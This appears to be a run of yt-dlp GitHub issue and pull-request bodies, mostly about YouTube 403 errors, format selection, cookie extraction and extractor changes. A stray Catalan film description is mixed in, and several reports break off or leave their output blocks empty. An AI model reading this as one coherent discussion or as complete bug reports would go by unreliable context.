### Region

USA

### Provide a description that is worded well enough to be understood

I know it's been mentioned that the problem was caused by work-arounds to fix the problem that was recently fixed in the latest nightly and master. Problem is, I've tested both the latest nightly and the latest master, a 1080p video is still downloading as 640x360, even with the workaround config arguments removed.

Maybe I'm misunderstanding proper use or misunderstanding what exactly was fixed.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [x] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Provide a description that is worded well enough to be understood

I used ut-dlp for about 2-4 months without any problems. But something happened and everything suddenly stopped working. I tried yt-dlp-ejs and the ""pip install -U --pre ""yt-dlp[default,deno]"""" and ""youtube:player_client=default,android;formats=missing_pot"" parameter. Unfortunately, it didn't help.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [x] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Region

Hungary

### Provide a description that is worded well enough to be understood

Mediaklikk has srt format subtitles available for several videos. yt-dlp currently can't detect it.

The url structure changed from the previous format, adding a category into the first part of the url.

Old url example: https://mediaklikk.hu/video/hazajaro-bilo-hegyseg-verocei-barangolas-a-drava-menten/
New url example: https://mediaklikk.hu/ismeretterjeszto/video/2026/01/29/ismeretterjeszto/hazajaro-also-csallokoz-csicsotol-csiliznyaradig/

Category get's detected from the new url format not the video display_id.

Currently wrong (with category, ""sorozat"" detected as display_id instead ""koronas-sas-3-evad-398-resz""):

When I run `~/virtualenvironment/bin/yt-dlp --extract-audio --audio-format best youtube-url` it shows this on Debian13:

```

```
I did run `~/virtualenvironment/bin/pip install -U yt-dlp-ejs` (if this is required please tell the user in the warning message) and `~/virtualenvironment/bin/pip install --upgrade yt-dlp` before the command and also tried appending `--remote-components ejs:github` to the command but so far nothing has solved this and I can't download any audio anymore which used to work fine.

### Please make sure the question is worded well enough to be understood

Hi i wanted to ask is there a feature in the ytdlp that marks down 18+ or NSFW website or returns a flag when identifying platform using input URL?

i tried exploring but i couldn't find any flags specific to identifying explicitly NSFW websites such as xhamster and similar:
my approach involved go over the the extractors i.e.

`from yt_dlp.extractor import gen_extractors`

### Provide verbose output that clearly demonstrates the problem

- [ ] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead

<!--
    **IMPORTANT**: PRs without the template will be CLOSED
    
    Due to the high volume of pull requests, it may be a while before your PR is reviewed.
    Please try to keep your pull request focused on a single bugfix or new feature.
    Pull requests with a vast scope and/or very large diff will take much longer to review.
    It is recommended for new contributors to stick to smaller pull requests, so you can receive much more immediate feedback as you familiarize yourself with the codebase.

    PLEASE AVOID FORCE-PUSHING after opening a PR, as it makes reviewing more difficult.
-->

### Description of your *pull request* and other information

DailyWire has changed a lot of website design since the initial commit in 2022. The website now has all media under `/episode/`, this PR removes the unused `/podcasts/` and `/videos/` URLs. Authentication is now done using a bearer token, episode data for member-only episodes must be fetched using graphql and Bearer token.

One test download is public, and should pass for everyone. The other test requires a subscription, and passes when I use my cookies.

**Note**: #9920 is now outdated, `/podcasts/` and `/videos/` are no longer used.

Fixes #

* Getting cookies for members-only content.
* Added graphql request to fetch authorization and episode data.
* Removed unused `/podcasts/` and `/videos`. Only `/episode/` is used.
* Used `show_name` data for `uploader` for more natural metadata. Otherwise everything is just ""DailyWire"" all over.

### Provide a description that is worded well enough to be understood

Apparently, since version 2026.01.29, not all audio tags 140 for the https protocol appear when the video has multiple audio tracks (however, all audio tracks for the m3u8 protocol do appear).

An example video that's live now and exhibiting this issue is (only the english track language for tag 140 of the https protocol is obtained): https://www.youtube.com/watch?v=FkXhKu80CWU

Previous versions of yt-dlp for this video link works ok and get all audio language tracks for the 140 https protocol

The verbose output for both versions is included below.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [x] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

I wanted to download and watch the first video https://www.youtube.com/watch?v=vojfIexRIIs from https://supernote.com/pages/note-system-everything-you-need-to-stay-organized. I get the error below.

It wasn't working for v2025.12.08 and it isn't working for the newest version 2026.01.29.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead

### Provide a description that is worded well enough to be understood

When running `yt-dlp` under Cygwin, the `--cookies-from-browser` option fails to locate browser databases (Firefox, Chrome, etc.). This is because Cygwin's `os.path.expandvars` implementation follows POSIX conventions (expecting `$VARIABLE`) rather than Windows conventions (expecting `%VARIABLE%`).

Currently, `yt_dlp/cookies.py` uses hardcoded `%APPDATA%` and `%LOCALAPPDATA%` strings when `sys.platform` is `cygwin`, resulting in literal strings that fail to expand and cause a `FileNotFoundError`.

Here is a short demonstration :

```
Python 3.12.12 (main, Oct 11 2025, 11:03:47) [GCC 13.4.0] on cygwin
Type ""help"", ""copyright"", ""credits"" or ""license"" for more information.
>>> import os, sys
>>> sys.platform
'cygwin'
>>> os.name
'posix'
>>> os.path.expandvars('%APPDATA%\\Mozilla\\Firefox\\Profiles')
'%APPDATA%\\Mozilla\\Firefox\\Profiles'
>>> os.path.expandvars('$APPDATA\\Mozilla\\Firefox\\Profiles')
'C:\\Users\\Steve\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles'
>>>
```

A possible fix involves checking the platform and using the appropriate variable expansion syntax for both Firefox and Chromium-based browser path logic.

I have prepared a patch (https://github.com/yt-dlp/yt-dlp/compare/master...VonJagdstrumel:yt-dlp:cygwin/cookies-expandvars) that:

1. Uses `$VAR` syntax for Cygwin and `%VAR%` for native Win32.
2. Uses `os.path.join` to build paths cleanly once the root environment variables are resolved.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead

El crític de cinema Aaron Cabañas presenta L’Été, el film que inaugura el quadríptic de les estacions de Marcel Hanoun, i que està ambientat al Maig del 68 francès. La pel·lícula, que planteja temes com ara la llibertat individual i el compromís polític, és el primer film en què el cineasta revela el dispositiu narratiu, els mecanismes que li permeten fer cinema, com subratllant que el film és una ficció.

L’Été, Marcel Hanoun, França, 1968, 35mm, 64 min

Còpia digital cortesia de Re:voir.

### Region

United States

### Provide a description that is worded well enough to be understood

There appears to be a regression for live videos in [yt-dlp 2026.01.29](https://github.com/yt-dlp/yt-dlp/releases/tag/2026.01.29) relative to the prior release, [yt-dlp 2025.12.08](https://github.com/yt-dlp/yt-dlp/releases/tag/2025.12.08).

An example video that's live now and exhibiting this issue is: https://www.youtube.com/watch?v=uBHqNaVjvgM

The verbose output for both versions is included below.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

"Error message on wrong line ### Checklist

- [x] I'm reporting a bug unrelated to a specific site
- [x] I've verified that I have **updated yt-dlp to nightly or master** ([update instructions](https://github.com/yt-dlp/yt-dlp#update-channels))
- [x] I've searched [known issues](https://github.com/yt-dlp/yt-dlp/issues/3766), [the FAQ](https://github.com/yt-dlp/yt-dlp/wiki/FAQ), and the [bugtracker](https://github.com/yt-dlp/yt-dlp/issues?q=is%3Aissue%20-label%3Aspam%20%20) for similar issues **including closed ones**. DO NOT post duplicates
- [x] I've read the [policy against AI/LLM contributions](https://github.com/yt-dlp/yt-dlp/blob/master/CONTRIBUTING.md#automated-contributions-ai--llm-policy) and understand I may be blocked from the repository if it is violated

### Provide a description that is worded well enough to be understood

### So, just to be clear: Report is not about 403 error. It's about `ERROR: unable to download video data: HTTP Error 403: Forbidden` message that on the same line as downloading progress.

<img width=""1229"" height=""212"" alt=""Image"" src=""https://github.com/user-attachments/assets/11720834-944f-473e-b846-c652d7116b99"" />

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

Hello I try to download a youtube video and it doesn't let me download from default option best video+audio.
However it works if I ask to download the m3u8 with 
"">yt-dlp -f 94 https://www.youtube.com/watch?v=BdLkwKM0-fk"" 

Note that while I didn't try for this video, a few days ago it was working for other videos, so the change is probably from youtube idk.

When downloading to my home folder, (or any other location) everything works as expected, but when I'm trying to download to my NFS share, the download simply does not start.

Creating/modifying file on the NFS share works without any issue.


### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Please make sure the question is worded well enough to be understood

### **Description**
I am using yt-dlp in a Dockerized Node.js environment to stream audio to a radio server. I am facing an issue where yt-dlp consistently selects Format 18 (combined Video+Audio), even though I have explicitly configured it to only fetch audio-only streams.

My goal is to minimize bandwidth and CPU usage by fetching only the DASH audio streams (like 140 or 251), but yt-dlp seems to ""overrule"" my filter settings when streaming to stdout.

### **Environment**
- yt-dlp version: Latest
- Setup: Node.js spawn piping to ffmpeg
- JS Runtime: Node.js (via --js-runtimes node)

### **The Evidence**
Even with the filter -f ""140/251/ba/best"", the verbose/info output shows that format 18 is being pulled:

```javascript
const ytProcess = spawn('yt-dlp', [
                '-vU',
                '--cookies', '/usr/src/app/cookies.txt',
                '--js-runtimes', 'node',
                '--remote-components', 'ejs:github',
                '--no-progress',
                '-o', '-', 
                '-f', '140/251/ba/best', 
                '--no-playlist', 
                '--buffer-size', '16K',
                '--user-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
                '--referer', 'https://www.youtube.com/',
                '--extractor-args', 'youtube:player_client=web', 
                url
            ]);
```

```
However, a manual -F check shows that pure audio formats are definitely available for this video:

```text
ID  EXT   RESOLUTION FPS CH │   FILESIZE   ACODEC      ASR
──────────────────────────────────────────────────────────
140 m4a   audio only      2 │    3.82MiB   mp4a.40.2   44k
251 webm  audio only      2 │    3.96MiB   opus        48k
18  mp4   360x360      25  2 │ ≈  1.92MiB   mp4a.40.2   22k  <-- Why is this chosen?
```

### **My Questions**
Why does yt-dlp prefer the combined format 18 over the higher quality audio-only DASH streams (140/251) when outputting to a pipe?

Is there a hidden priority where ""single-file"" formats like 18 are preferred over fragmented DASH formats when -o - is used?

### Provide verbose output that clearly demonstrates the problem

- [ ] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [ ] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Complete Verbose Output

### Region

United Kingdom

### Provide a description that is worded well enough to be understood

This is linked to this issue: https://github.com/yt-dlp/yt-dlp/issues/15712
But when using the workaround for yt-dlp to download this video in 420p (highest quality)
- https://www.youtube.com/watch?v=BK4RAIa5Z0w
I'm only getting the option for 320p. The 420p formats are 135+140.

I'm using the most updated version of yt-dlp pip (beta) and still hasn't worked.
I am unsure if I can do pip update on a master branch.

This is my Command:
yt-dlp -f 135+140 --extractor-args ""youtube:player_client=default,-android_sdkless"" ""https://www.youtube.com/watch?v=BK4RAIa5Z0w""

I have recently updated deno, ffmpeg +ffprobe and yt-dlp-ejs installed.



### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Region

US

### Provide a description that is worded well enough to be understood

I updated as well as installed deno earlier today to fix the 403 nonsense google rolled out on youtube. Downloads are working again quite seemlessly but the problem now is that videos are restricted to 640x360 rssolution despite my argument stating to download in 1080p.

> yt-dlp -S res:1080 -t mp4 --restrict-filenames --extractor-args ""youtube:player_client=default,-android_sdkless"" --sponsorblock-remove sponsor,selfpromo

Download was done via termux on a device running an android 11 variant.  I haven't had the opportunity yet to try on another device if it makes any difference.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Region

Hong Kong

### Provide a description that is worded well enough to be understood

Tried downloading video for archival purpose, but encountered HTTP error for some reason despite publicly accessible video. ONLY when I feed cookies thru firefox, the video can be downloaded. 

NOTE: not likely CloudFlare turnstiles because I have a previous attempt at less verbosity and the download interrupted itself
`[download]   4.8% of  197.84MiB at  105.65MiB/s ETA 00:01ERROR: unable to download video data: HTTP Error 403: Forbidden`

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Region

USA

### Provide a description that is worded well enough to be understood

Video starts to download a little, then fails quickly with an HTTP Error 403: Forbidden

(The ""Unable to download video subtitles"" is because i have it in the config to download when available, but if not, it just skips and continues)

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [x] If using API, add `'verbose': True` to `YoutubeDL` params instead

### Provide a description that is worded well enough to be understood

There are two main ways to get music from YouTube, either on the YouTube channel's ""Releases"" tab or from ""Artist Name - Topic"" channels.

Getting music from a releases tab works fine, just

```sh
$ yt-dlp --flat-playlist --print url https://www.youtube.com/@kikuo_sound/releases
https://www.youtube.com/playlist?list=OLAK5uy_m1TY1bJy4wi0ncYxwwg8wGsID9uSL1gYI
https://www.youtube.com/playlist?list=OLAK5uy_n-xzpQk3JzLM6-bW2OwxXiLS3qpTEk_U4
https://www.youtube.com/playlist?list=OLAK5uy_kk88vZ9l1VgjsJF7iVYTLQkui7C4JxlK0
...
```

However, trying to do the same on these Topic channels fails

```
$ yt-dlp --flat-playlist --print url https://www.youtube.com/channel/UCn47BZfh8yx_botGwlMF0gQ
WARNING: [youtube:tab] YouTube said: This playlist type is unviewable.
https://www.youtube.com/watch?v=ZyRJM-BnXTo
https://www.youtube.com/watch?v=dOxr9yctk6Y
https://www.youtube.com/watch?v=wdQALggQQLI
https://www.youtube.com/watch?v=DJmdk86PWGQ
https://www.youtube.com/watch?v=gyU3GwNJHPA
...
```

The above channel is ""greyl - Topic"" on YouTube, their topic/YouTube music channel does have playlists, but the above command returns only uploads. These really are playlists, but `yt-dlp` doesn't know how to access them.

<img width=""945"" height=""639"" alt=""Image"" src=""https://github.com/user-attachments/assets/92a05a8d-5e5c-4314-9848-91897856c1ec"" />

<img width=""1246"" height=""621"" alt=""Image"" src=""https://github.com/user-attachments/assets/0d9cb9ef-039c-4b76-8965-9840a294bc0e"" />

My goal in mind is to end up getting access to these playlist links programmatically, so I can go and download music nicely tagged using a couple scripts.

When running with verbose output in the above command using `-vU` as instructed, it ignores the `--print url` flag and opts print that it downloaded each item (but does nothing with them), so the output is different.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [ ] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

Indonesia

### Provide a description that is worded well enough to be understood

yt-dlp fails to reliably extract TikTok videos when downloading videos sequentially.

After several successful downloads, subsequent TikTok video URLs fail to extract video data (no formats detected / extraction fails), despite the URLs being valid and playable in a browser.
Retrying the same URLs individually after some time works again.

This suggests an issue with TikTok extraction under sequential or bulk download conditions rather than with the URLs themselves.

Command used:
yt-dlp -v https://www.tiktok.com/@cheseepink4/video/7595964938250669320

The same URLs play correctly in a browser without login using the same IP.

Reproducible using CLI by downloading multiple TikTok URLs one after another.

Command was initially run with -v flag. Running the same command with -vU produces identical extraction failures.


### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [x] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Region

United States

### Provide a description that is worded well enough to be understood

When attempting to download a playlist with yt-dlp --download-archive archive.txt ""https://www.youtube.com/playlist?list=PL0lqZ5cbzz1BcllbTut9lbZMx0vxIpXda""
getting a 403 error every time it tries to download (?) a file in the playlist
""unable to download video data: HTTP Error 403: Forbidden""
(this playlist has 22 items, I stopped it after 8 403s, it didn't create the archive.txt file)

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Region

UK - but via VPN all over the world.

### Provide a description that is worded well enough to be understood

When downloading the playlist:
https://www.pornhub.com/playlist/341574741
it only downloads first few pages. I've kinda experiences similar issue in browser window where you need to scroll very slowly to load next 30/50 videos... if scrolling to quick the next block of videos in the playlist doesn't load.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Complete Verbose Output

I am unable to download [this Youtube video](https://www.youtube.com/watch?v=TBV8_0BqIw8) on a Debian Linux system and also on an Alpine Linux system.

I can view the video perfectly well in Chrome on my Mac, when logged into Youtube and also when not logged into it.

```
# yt-dlp ""https://www.youtube.com/watch?v=TBV8_0BqIw8""
```

I get the following output:

I can download other Youtube videos.

I have tried installing a Javascript runtime.
- Installing node did nothing: yt-dlp complained that it couldn't find node, even when I told it where it was.
- Tried installing bun. Same problem. yt-dlp insisted it couldn't find bun, even when I told it where it was.
- Finally managed to get yt-dlp to accept quickjs, but I still can't download the video:

I tried `--impersonate chrome`. I tried `--legacy-server-connect`. I tried on a different computer. I tried via a VPN (as well as without).

Nothing worked.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Please make sure the question is worded well enough to be understood

This is just a generic question. There is no ouput to paste.

Yt-dlp has been working seamlessly for me for months since I installed deno thanks to special help on how to successfully install it from bashonly. (I needed to do an update for some other installed apps that deno required.) This has been the best supported app I've ever had. Thank you.

Now it looks like YT is again  trying to kill yt-dlp via SABRE, and that there may not be a workaround soon or eventually without giving YT one's login deets via cookies-from-browser. Is that right?

My question is how much jeopardy does one put one's YT account into when one gives their  YT login in a yt-dlp command? What has been the past experience of those who have been including browser cookies in yt-dlp commands? Has YT permanently banned anyone's account? When YT takes action against a YT account, does it also affect Google Drive, Gmail, Docs etc?

### Provide verbose output that clearly demonstrates the problem

- [ ] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [ ] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

_No response_

### Provide a description that is worded well enough to be understood

It seems that whyp.it has had a site change and now no audio tracks can be downloaded with yt-dlp, though they still play just fine on the website.

(note that my testing of yt-dlp is in a docker container, hence running as root)

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead

Austria

### Provide a description that is worded well enough to be understood

yt-dlp works for filmarchiv.at only for videos in _[Historische Filmdokumente](https://www.filmarchiv.at/de/filmarchiv-on/historische-filmdokumente)_, but movies from _[Filmgeschichte Österreich](https://www.filmarchiv.at/de/filmarchiv-on/filmgeschichte-oesterreich)_ cannot be downloaded.

For example: https://www.filmarchiv.at/de/filmarchiv-on/video/f_032BFOfIM6x7ecSYFElWkY  
The movie plays fine in  the browser and the m3u8 can be taken from the network panel of the browser debug tools (https://cdn.filmarchiv.at/f_032B/FOfIM6x7ecSYFElWkY_sv1/playlist.m3u8). When providing this to yt-dlp it downlaods fine.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [x] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Region

_No response_

### Provide a description that is worded well enough to be understood

If a SponsorBlock segment lies outside the video duration (which shouldn't be done, but is apparently possible), yt-dlp creates a file that lasts until the beginning (for some reason not end) of that last segment, causing a long freeze frame after the end of the actual video content, then the last bit of the video gets played at the end of the file.

Example: https://www.youtube.com/watch?v=jBrcBPXUBFw
The video is just 3min29sec long, but someone submitted a segment from 9:52.567 to 11:06.564, so yt-dlp makes a video file that is 9min52sec long, with most if it just showing a static image.
I have already downvoted the segment, so maybe it gets removed before this report is addressed. In that case, it should be possible to test it by creating a segment, manually entering a timestamp and then submitting it to the SponsorBlock testing server.
When jumping forwards with VLC into the broken part, it jumps right to the last few seconds, so you have to increase speed to go there instead.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [x] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Provide a description that is worded well enough to be understood

I know this isn't me requesting a bug or anything like that but...

I wanna know if you can implement a detection for when you're trying to download a video/audio on a storage that's running out of space and try to warn and cancel the download!

This happens to me on my phone (specifically an unofficial GUI app (YTDLnis)) that when the download is complete, when i check for the file... it doesn't appear there!
Tried to download using an SD Card (which i know is running out of space)...Checked the logs and it seems fine.

### Provide verbose output that clearly demonstrates the problem

- [ ] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [ ] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Provide a description that is worded well enough to be understood

When I input ""yt-dlp --cookies-from-browser firefox ""[YT URL HERE]"" --extract-audio --audio-format mp3 --audio-quality 0 --embed-thumbnail --output ""%(title)s.%(ext)s"""" I get the HTTP error 403. This only happens when trying to use cookies from my browser and only started happening after a more recent update.

"[Youtube] ""unable to download video data: HTTP Error 403: Forbidden"" with `android_sdkless` formats ### EDIT BY MAINTAINER: Fixed in latest release. Update!
---

### Checklist

- [x] I'm reporting that yt-dlp is broken on a **supported** site
- [x] I've verified that I have **updated yt-dlp to nightly or master** ([update instructions](https://github.com/yt-dlp/yt-dlp#update-channels))
- [x] I've checked that all provided URLs are playable in a browser with the same IP and same login details
- [x] I've checked that all URLs and arguments with special characters are [properly quoted or escaped](https://github.com/yt-dlp/yt-dlp/wiki/FAQ#video-url-contains-an-ampersand--and-im-getting-some-strange-output-1-2839-or-v-is-not-recognized-as-an-internal-or-external-command)
- [x] I've searched [known issues](https://github.com/yt-dlp/yt-dlp/issues/3766), [the FAQ](https://github.com/yt-dlp/yt-dlp/wiki/FAQ), and the [bugtracker](https://github.com/yt-dlp/yt-dlp/issues?q=is%3Aissue%20-label%3Aspam%20%20) for similar issues **including closed ones**. DO NOT post duplicates
- [x] I've read the [policy against AI/LLM contributions](https://github.com/yt-dlp/yt-dlp/blob/master/CONTRIBUTING.md#automated-contributions-ai--llm-policy) and understand I may be blocked from the repository if it is violated
- [x] I've read about [sharing account credentials](https://github.com/yt-dlp/yt-dlp/blob/master/CONTRIBUTING.md#are-you-willing-to-share-account-details-if-needed) and I'm willing to share it if required

### Region

USA

### Provide a description that is worded well enough to be understood

Occasionally, yt-dlp fails with HTTP 403 error when using -t mp4 option.  See the verbose output.  When -t mp4 option is not used, the download works and the wbem file is downloaded.  If -t mp4 option is specified, the download works for a few seconds, and then it fails with HTTP 403

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Complete Verbose Output

"Is it possible to download an HDR quality video? On Rutube, I selected several videos labeled HDR and requested information.

All videos are not HDR, obviously I'm doing something wrong....
There is no 10‑bit VP9 or HEVC → there is no real HDR stream for download

Is it possible to get HDR or only SDR through yt-dlp?
 
```

"[ie/tiktok] Improve formats' consistency by using geo-bypass Work in progress!

Closes #15690

**TODO**:

I strongly dislike how the PR is currently passing around magical status codes and making the `_extract_web_data_and_status` method non-fatal under certain circumstances when it should be fatal, but I haven't come up with anything better yet.

**Challenges with hardcoding XFF:**
- It can cause an HTTP Error 503 response for the webpage request
- It can result in useless `video_data` with a `status` code of `10101` (""SysErrPanic"")
- It can yield a webpage that doesn't have any ""universal data"" and appears to possibly be a captcha challenge page (an *actual* captcha instead the simple JS proof-of-work page that we already solved in e3f0d8b731b40176bcc632bf92cfe5149402b202)

### Provide a description that is worded well enough to be understood

Hello I tried to download youtube clips from a pretty long video to not download all the video.
Resulting in error, maybe it's more from ffmpeg than yt-dlp, idk
Normal youtube video download work.

this is the url: https://youtube.com/clip/UgkxxFX7JEAHi7vltei7r5p2aHhMdZKNjRLO?si=GKl5sj5qdcVvczqb

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [x] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Complete Verbose Output

"How to keep temporary files when downloading Twitch live stream? ### Checklist

- [x] I'm asking a question and **not** reporting a bug or requesting a feature
- [x] I've looked through the [README](https://github.com/yt-dlp/yt-dlp#readme)
- [x] I've verified that I have **updated yt-dlp to nightly or master** ([update instructions](https://github.com/yt-dlp/yt-dlp#update-channels))
- [x] I've searched [known issues](https://github.com/yt-dlp/yt-dlp/issues/3766), [the FAQ](https://github.com/yt-dlp/yt-dlp/wiki/FAQ), and the [bugtracker](https://github.com/yt-dlp/yt-dlp/issues?q=is%3Aissue%20-label%3Aspam%20%20) for similar questions **including closed ones**. DO NOT post duplicates
- [x] I've read the [policy against AI/LLM contributions](https://github.com/yt-dlp/yt-dlp/blob/master/CONTRIBUTING.md#automated-contributions-ai--llm-policy) and understand I may be blocked from the repository if it is violated

### Please make sure the question is worded well enough to be understood

Hi. How can i save fragments of Twitch live stream same as i can save fragments of Youtube live stream?
I was downloading Twitch live stream with ""--live-from-start"" and ""--keep-fragments"" didn't work.
When downloading Youtube live stream if my connection breaks i can delete completed file, start downloading again, yt-dlp will skip already downloaded fragments and continue downloading live stream.
Would be cool if twitch can work the same.

What ""-vU"" do? It's not described in readme. i searched for ""-vU"". Nothing. There is ""-v"".

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Complete Verbose Output

"cookies-from-browser silently failing in python client ### Checklist

- [x] I'm reporting a bug unrelated to a specific site
- [x] I've verified that I have **updated yt-dlp to nightly or master** ([update instructions](https://github.com/yt-dlp/yt-dlp#update-channels))
- [x] I've searched [known issues](https://github.com/yt-dlp/yt-dlp/issues/3766), [the FAQ](https://github.com/yt-dlp/yt-dlp/wiki/FAQ), and the [bugtracker](https://github.com/yt-dlp/yt-dlp/issues?q=is%3Aissue%20-label%3Aspam%20%20) for similar issues **including closed ones**. DO NOT post duplicates
- [x] I've read the [policy against AI/LLM contributions](https://github.com/yt-dlp/yt-dlp/blob/master/CONTRIBUTING.md#automated-contributions-ai--llm-policy) and understand I may be blocked from the repository if it is violated

### Provide a description that is worded well enough to be understood

Using the latest nightly build inside a python virtual environment (Linux, python-3.14.2).  Running `yt-dlp --prefer-free-formats --audio-format mp3 --continue --no-playlist --force-ipv4 --verbose --format 'bestvideo[height<=720]+bestaudio/best' --cookies-from-browser firefox 'https://www.youtube.com/v/tB2m3Jni21s'` works as expected, it extracts the firefox cookies, and then proceeds to download the specified video.

However, using the python client with the same options never extracts the firefox cookies, and then fails the download as a result.  There are no errors or warnings related to the extraction, it seemingly never happens at all.

The python code is as follows:
```
def download_files(dl_files):
    """"""Hand off to youtube_dl to download content.""""""
    dl_location = '/media0/tmp/tv/lonni'
    ydl_opts = {'outtmpl': f'{dl_location}/%(title)s-%(id)s.%(ext)s',
    	    	'logger': MyLogger(),
		'progress_hooks': [my_hook],
                'verbose': True,
                'prefer-free-formats': True,
                'audio-format': 'mp3',
                'format': 'bestvideo[height<=720]+bestaudio/best',
                'continue': True,
                'noplaylist': True,
                'force-ipv4': True,
                'js_runtimes': {'deno': {'path': '/usr/bin/deno'}},
                'cookies-from-browser': 'firefox',
                }
    with yt_dlp.YoutubeDL(ydl_opts) as ydl:
        try:
            ydl.download(dl_files.values())
        except Exception as err:
            print(f'Error:\t{err}')
            return
    return dl_files
```

